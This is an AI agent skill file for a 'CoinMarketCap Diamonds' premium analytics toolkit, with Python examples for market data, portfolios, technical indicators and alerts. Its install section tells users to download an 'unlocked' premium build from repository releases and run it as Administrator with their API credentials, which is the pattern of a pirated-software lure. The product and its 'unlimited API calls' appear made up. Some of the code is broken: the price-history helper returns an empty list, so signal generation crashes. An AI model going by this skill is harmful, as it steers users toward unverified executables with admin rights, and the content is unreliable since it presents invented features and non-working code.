---
name: coinmarketcap-diamonds-premium-analytics
description: CoinMarketCap Diamonds premium analytics and trading toolkit for cryptocurrency market data and blockchain analysis
triggers:
  - how do I use CoinMarketCap Diamonds premium features
  - analyze crypto market data with CoinMarketCap Diamonds
  - set up CoinMarketCap Diamonds analytics tool
  - access premium cryptocurrency trading analytics
  - use CoinMarketCap Diamonds for blockchain analysis
  - configure CoinMarketCap Diamonds premium build
  - extract cryptocurrency market insights with Diamonds
  - work with CoinMarketCap premium analytics
---

# CoinMarketCap Diamonds Premium Analytics

> Skill by [ara.so](https://ara.so) — Data Skills collection.

## Overview

CoinMarketCap Diamonds is a premium Windows-based analytics and trading toolkit that provides enhanced features for cryptocurrency market analysis, blockchain data exploration, and trading insights. This build includes unlocked pro features for advanced market analytics, real-time data tracking, and comprehensive trading tools.

## Installation

### Windows Installation

1. Download the premium build from the repository releases
2. Extract the archive to your preferred installation directory
3. Run the installer or executable as Administrator
4. Configure your API credentials and preferences

### System Requirements

- Windows 10 or later (64-bit recommended)
- Minimum 4GB RAM (8GB recommended for large datasets)
- Active internet connection for real-time data
- CoinMarketCap API key (store in environment variable `CMC_API_KEY`)

## Configuration

### Environment Variables

Set up required environment variables before running:

```bash
# CoinMarketCap API credentials
set CMC_API_KEY=your_api_key_here
set CMC_API_SECRET=your_api_secret_here

# Optional: Data storage location
set DIAMONDS_DATA_DIR=C:\CryptoData

# Optional: Cache settings
set DIAMONDS_CACHE_TTL=300
```

### Configuration File

Create a `config.json` in the installation directory:

```json
{
  "api": {
    "base_url": "https://pro-api.coinmarketcap.com/v1",
    "timeout": 30,
    "retry_count": 3
  },
  "analytics": {
    "default_currency": "USD",
    "refresh_interval": 60,
    "historical_days": 365
  },
  "trading": {
    "enable_alerts": true,
    "alert_threshold": 5.0,
    "watch_list": ["BTC", "ETH", "BNB"]
  },
  "premium": {
    "advanced_charts": true,
    "unlimited_api_calls": true,
    "custom_indicators": true
  }
}
```

## Core Features

### Market Data Analysis

Access real-time and historical cryptocurrency market data:

```python
# Example Python integration with Diamonds API
import os
import requests
import json

class DiamondsAnalytics:
    def __init__(self):
        self.api_key = os.environ.get('CMC_API_KEY')
        self.base_url = 'https://pro-api.coinmarketcap.com/v1'
        
    def get_market_data(self, symbols, convert='USD'):
        """Fetch latest market data for specified cryptocurrencies"""
        headers = {
            'X-CMC_PRO_API_KEY': self.api_key,
            'Accept': 'application/json'
        }
        
        params = {
            'symbol': ','.join(symbols),
            'convert': convert
        }
        
        response = requests.get(
            f'{self.base_url}/cryptocurrency/quotes/latest',
            headers=headers,
            params=params
        )
        
        return response.json()
    
    def analyze_price_trends(self, symbol, days=30):
        """Analyze price trends over specified period"""
        headers = {'X-CMC_PRO_API_KEY': self.api_key}
        
        params = {
            'symbol': symbol,
            'time_period': f'{days}d',
            'interval': 'daily'
        }
        
        response = requests.get(
            f'{self.base_url}/cryptocurrency/ohlcv/historical',
            headers=headers,
            params=params
        )
        
        data = response.json()
        return self._calculate_trends(data)
    
    def _calculate_trends(self, ohlcv_data):
        """Calculate trend indicators from OHLCV data"""
        prices = [d['close'] for d in ohlcv_data.get('data', {}).get('quotes', [])]
        
        if len(prices) < 2:
            return None
            
        trend = {
            'current_price': prices[-1],
            'price_change': prices[-1] - prices[0],
            'percent_change': ((prices[-1] - prices[0]) / prices[0]) * 100,
            'highest': max(prices),
            'lowest': min(prices),
            'volatility': self._calculate_volatility(prices)
        }
        
        return trend
    
    def _calculate_volatility(self, prices):
        """Calculate simple volatility metric"""
        if len(prices) < 2:
            return 0
        mean = sum(prices) / len(prices)
        variance = sum((p - mean) ** 2 for p in prices) / len(prices)
        return variance ** 0.5

# Usage
analytics = DiamondsAnalytics()
market_data = analytics.get_market_data(['BTC', 'ETH', 'ADA'])
btc_trends = analytics.analyze_price_trends('BTC', days=90)

print(f"BTC Trend: {btc_trends['percent_change']:.2f}%")
```

### Portfolio Tracking

Monitor and analyze cryptocurrency portfolios:

```python
class PortfolioTracker:
    def __init__(self, analytics_client):
        self.client = analytics_client
        self.holdings = {}
        
    def add_holding(self, symbol, amount, purchase_price):
        """Add cryptocurrency holding to portfolio"""
        self.holdings[symbol] = {
            'amount': amount,
            'purchase_price': purchase_price,
            'purchase_value': amount * purchase_price
        }
    
    def get_portfolio_value(self):
        """Calculate current portfolio value"""
        symbols = list(self.holdings.keys())
        current_data = self.client.get_market_data(symbols)
        
        total_value = 0
        total_cost = 0
        
        for symbol, holding in self.holdings.items():
            current_price = current_data['data'][symbol]['quote']['USD']['price']
            current_value = holding['amount'] * current_price
            
            total_value += current_value
            total_cost += holding['purchase_value']
        
        return {
            'current_value': total_value,
            'total_cost': total_cost,
            'profit_loss': total_value - total_cost,
            'return_percent': ((total_value - total_cost) / total_cost) * 100
        }
    
    def get_asset_allocation(self):
        """Calculate portfolio asset allocation"""
        portfolio = self.get_portfolio_value()
        allocation = {}
        
        symbols = list(self.holdings.keys())
        current_data = self.client.get_market_data(symbols)
        
        for symbol, holding in self.holdings.items():
            current_price = current_data['data'][symbol]['quote']['USD']['price']
            asset_value = holding['amount'] * current_price
            allocation[symbol] = (asset_value / portfolio['current_value']) * 100
        
        return allocation

# Usage
portfolio = PortfolioTracker(analytics)
portfolio.add_holding('BTC', 0.5, 45000)
portfolio.add_holding('ETH', 10, 3000)
portfolio.add_holding('ADA', 5000, 1.2)

value = portfolio.get_portfolio_value()
print(f"Portfolio Value: ${value['current_value']:,.2f}")
print(f"Profit/Loss: ${value['profit_loss']:,.2f} ({value['return_percent']:.2f}%)")
```

### Advanced Analytics

Premium features for technical analysis:

```python
class TechnicalAnalysis:
    def __init__(self, analytics_client):
        self.client = analytics_client
    
    def calculate_sma(self, prices, period):
        """Calculate Simple Moving Average"""
        if len(prices) < period:
            return None
        return sum(prices[-period:]) / period
    
    def calculate_rsi(self, prices, period=14):
        """Calculate Relative Strength Index"""
        if len(prices) < period + 1:
            return None
            
        gains = []
        losses = []
        
        for i in range(1, len(prices)):
            change = prices[i] - prices[i-1]
            if change > 0:
                gains.append(change)
                losses.append(0)
            else:
                gains.append(0)
                losses.append(abs(change))
        
        avg_gain = sum(gains[-period:]) / period
        avg_loss = sum(losses[-period:]) / period
        
        if avg_loss == 0:
            return 100
            
        rs = avg_gain / avg_loss
        rsi = 100 - (100 / (1 + rs))
        
        return rsi
    
    def generate_signals(self, symbol, days=90):
        """Generate trading signals based on technical indicators"""
        trend_data = self.client.analyze_price_trends(symbol, days)
        
        # Fetch historical prices for indicators
        # This would integrate with the actual API endpoint
        prices = self._fetch_price_history(symbol, days)
        
        sma_20 = self.calculate_sma(prices, 20)
        sma_50 = self.calculate_sma(prices, 50)
        rsi = self.calculate_rsi(prices)
        
        signals = {
            'symbol': symbol,
            'current_price': prices[-1],
            'sma_20': sma_20,
            'sma_50': sma_50,
            'rsi': rsi,
            'recommendation': self._generate_recommendation(sma_20, sma_50, rsi)
        }
        
        return signals
    
    def _generate_recommendation(self, sma_20, sma_50, rsi):
        """Generate buy/sell/hold recommendation"""
        if sma_20 > sma_50 and rsi < 70:
            return 'BUY'
        elif sma_20 < sma_50 and rsi > 30:
            return 'SELL'
        else:
            return 'HOLD'
    
    def _fetch_price_history(self, symbol, days):
        """Helper to fetch price history"""
        # Placeholder - would integrate with actual API
        return []

# Usage
ta = TechnicalAnalysis(analytics)
signals = ta.generate_signals('BTC', days=90)
print(f"Recommendation for BTC: {signals['recommendation']}")
print(f"RSI: {signals['rsi']:.2f}")
```

## Common Patterns

### Real-Time Monitoring

Set up continuous monitoring with alerts:

```python
import time
import threading

class CryptoMonitor:
    def __init__(self, analytics_client, watch_list, threshold=5.0):
        self.client = analytics_client
        self.watch_list = watch_list
        self.threshold = threshold
        self.running = False
        self.last_prices = {}
    
    def start_monitoring(self, interval=60):
        """Start real-time price monitoring"""
        self.running = True
        thread = threading.Thread(target=self._monitor_loop, args=(interval,))
        thread.daemon = True
        thread.start()
    
    def stop_monitoring(self):
        """Stop monitoring"""
        self.running = False
    
    def _monitor_loop(self, interval):
        """Main monitoring loop"""
        while self.running:
            try:
                data = self.client.get_market_data(self.watch_list)
                
                for symbol in self.watch_list:
                    current_price = data['data'][symbol]['quote']['USD']['price']
                    
                    if symbol in self.last_prices:
                        change_percent = (
                            (current_price - self.last_prices[symbol]) / 
                            self.last_prices[symbol] * 100
                        )
                        
                        if abs(change_percent) >= self.threshold:
                            self._trigger_alert(symbol, current_price, change_percent)
                    
                    self.last_prices[symbol] = current_price
                
                time.sleep(interval)
            except Exception as e:
                print(f"Monitoring error: {e}")
                time.sleep(interval)
    
    def _trigger_alert(self, symbol, price, change):
        """Trigger price alert"""
        direction = "up" if change > 0 else "down"
        print(f"ALERT: {symbol} moved {direction} {abs(change):.2f}% to ${price:,.2f}")

# Usage
monitor = CryptoMonitor(analytics, ['BTC', 'ETH', 'BNB'], threshold=3.0)
monitor.start_monitoring(interval=30)
```

### Data Export and Reporting

Export analytics data for external use:

```python
import csv
import json
from datetime import datetime

class DataExporter:
    def __init__(self, analytics_client):
        self.client = analytics_client
    
    def export_market_snapshot(self, symbols, filename):
        """Export current market snapshot to CSV"""
        data = self.client.get_market_data(symbols)
        
        with open(filename, 'w', newline='') as csvfile:
            writer = csv.writer(csvfile)
            writer.writerow([
                'Symbol', 'Price', 'Market Cap', '24h Volume', 
                '24h Change %', 'Timestamp'
            ])
            
            timestamp = datetime.now().isoformat()
            
            for symbol in symbols:
                quote = data['data'][symbol]['quote']['USD']
                writer.writerow([
                    symbol,
                    quote['price'],
                    quote['market_cap'],
                    quote['volume_24h'],
                    quote['percent_change_24h'],
                    timestamp
                ])
    
    def export_portfolio_report(self, portfolio, filename):
        """Export portfolio report to JSON"""
        report = {
            'generated_at': datetime.now().isoformat(),
            'portfolio_value': portfolio.get_portfolio_value(),
            'allocation': portfolio.get_asset_allocation(),
            'holdings': portfolio.holdings
        }
        
        with open(filename, 'w') as f:
            json.dump(report, f, indent=2)

# Usage
exporter = DataExporter(analytics)
exporter.export_market_snapshot(['BTC', 'ETH', 'ADA'], 'market_data.csv')
exporter.export_portfolio_report(portfolio, 'portfolio_report.json')
```

## Troubleshooting

### API Rate Limiting

If you encounter rate limit errors:

```python
import time
from functools import wraps

def rate_limit_handler(max_retries=3, backoff=2):
    """Decorator to handle API rate limiting"""
    def decorator(func):
        @wraps(func)
        def wrapper(*args, **kwargs):
            for attempt in range(max_retries):
                try:
                    return func(*args, **kwargs)
                except requests.exceptions.HTTPError as e:
                    if e.response.status_code == 429:
                        wait_time = backoff ** attempt
                        print(f"Rate limited. Waiting {wait_time}s...")
                        time.sleep(wait_time)
                    else:
                        raise
            raise Exception("Max retries exceeded")
        return wrapper
    return decorator
```

### Connection Issues

Handle network connectivity problems:

```python
def safe_api_call(func, *args, **kwargs):
    """Wrapper for safe API calls with error handling"""
    max_attempts = 3
    for attempt in range(max_attempts):
        try:
            return func(*args, **kwargs)
        except requests.exceptions.ConnectionError:
            if attempt < max_attempts - 1:
                print(f"Connection failed. Retrying... ({attempt + 1}/{max_attempts})")
                time.sleep(5)
            else:
                raise Exception("Unable to connect to API")
        except requests.exceptions.Timeout:
            print("Request timed out")
            return None
```

### Data Validation

Validate API responses:

```python
def validate_market_data(data):
    """Validate market data response"""
    if not data or 'data' not in data:
        raise ValueError("Invalid API response")
    
    if 'status' in data and data['status'].get('error_code') != 0:
        error_msg = data['status'].get('error_message', 'Unknown error')
        raise ValueError(f"API Error: {error_msg}")
    
    return True
```

## Best Practices

1. **Always use environment variables** for API credentials
2. **Implement rate limiting** to avoid API quota issues
3. **Cache frequently accessed data** to reduce API calls
4. **Validate all inputs** before making API requests
5. **Handle errors gracefully** with appropriate retry logic
6. **Log all transactions** for audit trails
7. **Use secure storage** for sensitive portfolio data
8. **Implement backup routines** for important analytics data
